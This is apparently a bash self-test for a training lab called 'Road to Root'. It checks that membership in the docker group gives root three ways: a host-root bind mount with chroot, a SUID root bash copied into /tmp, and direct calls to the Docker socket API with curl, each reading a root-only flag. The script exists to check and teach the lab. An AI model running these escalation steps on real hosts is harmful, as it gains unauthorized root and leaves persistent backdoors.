#!/usr/bin/env bash
# Road to Root — Docker-socket lab self-test. Three stations on target-docker.
# Run as labuser1 inside the container. Exit 0 means the docker group gave root
# three different ways. Requires the inner Docker daemon (started by entrypoint)
# and the baked rtr/bb image.
set -u
FLAG='R2R{'
SOCK=/var/run/docker.sock
P=0; F=0
pass(){ echo "  [PASS] $1"; P=$((P + 1)); }
fail(){ echo "  [FAIL] $1"; F=$((F + 1)); }

echo "== identity =="
id

echo "== control: the flag must NOT be readable as $(id -un) =="
if cat /root/flag.txt 2>/dev/null; then
  echo "  [FAIL] control — flag readable without the socket"; exit 1
else
  echo "  [PASS] control — flag is root-only"
fi

echo "== wait for the inner Docker daemon + rtr/bb image =="
up=0
for i in $(seq 1 40); do
  if docker info >/dev/null 2>&1 && docker image inspect rtr/bb >/dev/null 2>&1; then up=1; break; fi
  sleep 2
done
[ "$up" = 1 ] && echo "  daemon up, rtr/bb present" || { echo "  [FAIL] inner daemon/image never came up"; exit 1; }

echo "== A — docker run -v /:/host chroot cat =="
A_OUT="$(docker run --rm -v /:/host rtr/bb chroot /host cat /root/flag.txt 2>/dev/null)"
echo "$A_OUT" | grep -q "$FLAG" && pass "A  mount host + chroot -> read flag" \
  || fail "A  mount host + chroot -> read flag"

echo "== B — write a SUID root bash onto the host via the mount =="
docker run --rm -v /:/host rtr/bb chroot /host sh -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' 2>/dev/null
B_OUT="$(/tmp/rootbash -p -c 'id -u; cat /root/flag.txt' 2>/dev/null)"
echo "$B_OUT" | grep -q "$FLAG" && pass "B  SUID root bash -> persistent root" \
  || fail "B  SUID root bash -> persistent root"
rm -f /tmp/rootbash 2>/dev/null || true

echo "== C — raw socket HTTP API with curl (no docker client) =="
C_OUT=""
if command -v curl >/dev/null && command -v jq >/dev/null; then
  CID=$(curl -s --unix-socket "$SOCK" -X POST -H 'Content-Type: application/json' \
    -d '{"Image":"rtr/bb","Cmd":["chroot","/host","cat","/root/flag.txt"],"HostConfig":{"Binds":["/:/host"]}}' \
    http://localhost/containers/create 2>/dev/null | jq -r .Id 2>/dev/null)
  if [ -n "${CID:-}" ] && [ "$CID" != null ]; then
    curl -s --unix-socket "$SOCK" -X POST "http://localhost/containers/$CID/start" >/dev/null 2>&1
    curl -s --unix-socket "$SOCK" -X POST "http://localhost/containers/$CID/wait" >/dev/null 2>&1
    C_OUT="$(curl -s --unix-socket "$SOCK" "http://localhost/containers/$CID/logs?stdout=1&stderr=1" 2>/dev/null | tr -cd '[:print:]\n')"
    curl -s --unix-socket "$SOCK" -X DELETE "http://localhost/containers/$CID" >/dev/null 2>&1
  fi
fi
echo "$C_OUT" | grep -q "$FLAG" && pass "C  raw /var/run/docker.sock API -> read flag" \
  || fail "C  raw /var/run/docker.sock API -> read flag"

echo "== score =="
echo "  PASS=$P  FAIL=$F   (expected: 3 pass / 0 fail)"
[ "$F" -eq 0 ] && { echo "  DOCKER-GROUP = ROOT, THREE WAYS -- OK"; exit 0; } \
               || { echo "  SOME PATHS FAILED"; exit 1; }
